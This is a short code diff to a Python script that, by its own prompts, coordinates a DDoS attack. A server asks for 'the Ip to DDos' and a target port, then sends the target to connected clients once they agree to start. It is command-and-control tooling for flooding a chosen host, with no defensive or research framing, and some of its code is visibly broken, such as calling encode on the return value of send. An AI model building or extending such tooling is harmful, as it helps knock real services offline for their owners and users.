@@ -21,8 +21,9 @@ def get_publicIp():
 def start_party():
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     port = int(input("Enter the port no to host a Server : "))
-    Target = input("Enter the Ip to DDos : ")
 
+    Target = input("Enter the Ip to DDos : ")
+    tPort = input("Enter The Target port to DDos : ")
     try :
         ipaddress.ip_address(Target)
     except ValueError:
@@ -46,6 +47,7 @@ def start_party():
             confo = c.recv(1024).decode()
             if(confo == 's' or confo == 'S'):
                 c.send("Started").encode()
+                c.send(str(Target+":"+port).encode())
                 logit(addr=addr,threadCount=thread,messg="Started")
             else:
                 c.send("ITs Not Starting ....".encode())
